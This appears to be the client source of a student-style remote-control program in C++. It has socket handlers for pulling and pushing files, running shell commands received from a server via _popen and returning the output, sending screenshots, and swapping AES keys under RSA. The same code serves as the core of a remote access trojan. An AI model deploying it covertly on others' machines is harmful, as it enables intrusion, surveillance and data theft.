#include <WinSock2.h>
#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"Shlwapi.lib")
#include <stdio.h>
#include <WS2tcpip.h>
#include <direct.h>
#include <shlwapi.h>

#include "DATA.h"
#include "helper.h"
#include "initSock.h"

// lib & h for screenshot
#include "rca.h"
#include <ctime>
#pragma comment(lib, "./RemoteControlAssistance.lib")

SOCKET g_ClientSock = 0;

void DownloadFile(SOCKET ConnectSocket, char* path)
{
	FILE* pFile = NULL;
	fopen_s(&pFile, path, "rb+");     
	if (!pFile) {
		printf("%s file doesn't exist\n", path);
		return;
	}

	fseek(pFile, 0, SEEK_END);
	int size = ftell(pFile);
	fseek(pFile, 0, SEEK_SET);
	char* buff = (char*)malloc(size);
	memset(buff, 0, size);
	fread(buff, sizeof(char), size, pFile);
	MESSAGEINFO message = AnalazyMessage(size);
	message.type = DOWNLOAD;
	SendMsgInfo(ConnectSocket, (MSG_TYPE)message.type, message.size, message.arg, MAX_PATH);  // done

	for (int i = 0; i < message.count; i++)
	{
		MYDATAINFO data = {};
		if (i == message.count - 1)
		{
			data.size = message.size;
		}
		else
		{
			data.size = DATA_SIZE;
		}
		memcpy_s(data.buff, data.size,
			buff + i * DATA_SIZE, data.size);
		SendMsgData(ConnectSocket, (char*)&data.buff, data.size);  // Done
	}

	fclose(pFile);
	free(buff);
	buff = NULL;
}


void UploadFile(SOCKET ConnectSocket, MESSAGEINFO* pMsg) {
	FILE* pFile;
	fopen_s(&pFile, pMsg->arg, "wb");     // passed the arg2 here so that we can upload the file to the dest path.
	SendMsgInfo(ConnectSocket, (MSG_TYPE)pMsg->type, pMsg->size, pMsg->arg, MAX_PATH); // done
	//send(ConnectSocket, (char*)pMsg, sizeof(MESSAGEINFO), NULL);

	char path[MAX_PATH] = {};
	if (!pFile) {
		char* pathName = _getcwd(path, sizeof(path));
		printf("%s", pathName);
		//concatenate the path and filename
		char* fileName = PathFindFileNameA(pMsg->arg);
		printf("filename: %s\n", fileName);

		PathAppendA(path, fileName);
		printf("path: %s\n", path);
		fopen_s(&pFile, path, "wb");
	}


	for (int i = 0; i < pMsg->count; i++)
	{
		MYDATAINFO dataInfo = {};
		recv(ConnectSocket, (char*)&dataInfo, sizeof(MYDATAINFO), NULL);
		AESDecrpty((PUCHAR)&dataInfo, sizeof(MYDATAINFO), (PUCHAR)&dataInfo);

		fwrite(dataInfo.buff, dataInfo.size, 1, pFile);
	}
	fclose(pFile);
	MYDATAINFO tempSuccessMsg = {};
	memcpy(tempSuccessMsg.buff, "successfully uploaded", DATA_SIZE);
	tempSuccessMsg.size = DATA_SIZE;
	SendMsgData(g_ClientSock, tempSuccessMsg.buff, tempSuccessMsg.size); // done
}




void SystemCmd() {
	SendMsgInfo(g_ClientSock, SYS, 0);   // pair 3 msgInfo cmd sys
	while (true) {
		MYDATAINFO dataInfo = {};
		int ret = recv(g_ClientSock, (char*)&dataInfo, sizeof(MYDATAINFO), NULL);    // pair 4 cmd sys data
		if (ret == 0 || ret == -1) {
			break;
		}

		AESDecrpty((PUCHAR)&dataInfo, sizeof(MYDATAINFO), (PUCHAR)&dataInfo);

		if (!strcmp(CMD_QUIT, dataInfo.buff)) {
			SendMsgData(g_ClientSock, (char*)dataInfo.buff, strlen(dataInfo.buff));
			break;
		}

		if (HandleCD(dataInfo.buff)) {
			continue;
		}

		FILE* pFile = _popen(dataInfo.buff, "r");
		while (true)
		{
			char buf[DATA_SIZE] = {};
			char* p = fgets(buf, DATA_SIZE, pFile);
			if (!p) break;
			SendMsgData(g_ClientSock, buf, strlen(buf));
		}
		fclose(pFile);
	}
}

void Screen(MESSAGEINFO* pMsg) {
	PUCHAR pBuf = Screenshot();
	int fileSize = GetScreenPicSize();
	printf("fileSize = %d\n", fileSize);


	int nCount = GET_COUNT(fileSize, DATA_SIZE);
	SendMsgInfo(g_ClientSock, SCREEN, fileSize);
	



	clock_t t = clock();

	for (int i = 0; i < nCount;)
	{
		if (clock() - t > 1) {
			t = clock();
			char buf[DATA_SIZE] = {};
			int size = DATA_SIZE;
			if (i == nCount - 1 && fileSize % DATA_SIZE) {
				size = fileSize % DATA_SIZE;
			}
			memcpy(buf, pBuf, size);
			pBuf += size;

			SendMsgData(g_ClientSock, buf, size);
			printf("sent %dth block, size = %d\n", i + 1, size);
			i++;
		}
	}
	printf("\nfree picture memory\n");
	// free memory
	ReleasePic();
}



void ChangeSession(MESSAGEINFO* pMsg) {
	SendMsgInfo(g_ClientSock, (MSG_TYPE)pMsg->type, pMsg->size, pMsg->arg, MAX_PATH);
	return; 
}


void KeyCmd() {
	MYDATAINFO dataInfo = {};
	// get the rsa pubKey from server
	int ret = recv(g_ClientSock, (char*)&dataInfo, sizeof(MYDATAINFO), NULL);

	// use default aes symmetric key to decrypt the data
	AESDecrpty((PUCHAR)&dataInfo, sizeof(MYDATAINFO), (PUCHAR)&dataInfo);

	// set rsa pubKey as a method for aes key pair encryption.
	SetPubKey((PUCHAR)dataInfo.buff, dataInfo.size);
	printf("%s\n", dataInfo.buff);

	// save the default aesKey and aesIv
	PUCHAR pKey = GetAESKey();
	printf("%s\n", pKey);
	PUCHAR pIv = GetAESIv();
	printf("%s\n", pIv);

	UCHAR oldKey[16] = {};
	UCHAR oldIv[16] = {}; 
	memcpy(oldKey, pKey, 16);
	memcpy(oldIv, pIv, 16);

	// init aes
	InitAES();
	// create new aes key
	pKey = GetAESKey();
	pIv = GetAESIv();
	UCHAR newKey[16] = {};
	UCHAR newIv[16] = {};
	memcpy(newKey, pKey, 16);
	memcpy(newIv, pIv, 16);
	printf("newKey = %s\n", newKey);
	printf("newIv = %s\n", newIv);

	//concatenate the key and iv in an array
	char buf[32] = {};
	memcpy(buf, pKey, 16);
	printf("buf=%s\n", pKey);
	memcpy(buf + 16, pIv, 16);
	printf("buf+16= %s\n", pIv);

	// send the new aes key encrypted by rsa pubKey originally from the server
	int outSize;
	PUCHAR pData = RSAEncrypt((PUCHAR)&buf, sizeof(buf), &outSize);
	printf("pData = %s\n", pData);

	// still need to send the new aesKey&Iv with the oldKey&Iv
	SetAESKeyAndIv(oldKey, oldIv);
	SendMsgInfo(g_ClientSock, KEY, outSize);
	SendMsgData(g_ClientSock, (char*)pData, outSize);

	// set new aes key and iv
	SetAESKeyAndIv(newKey, newIv);
}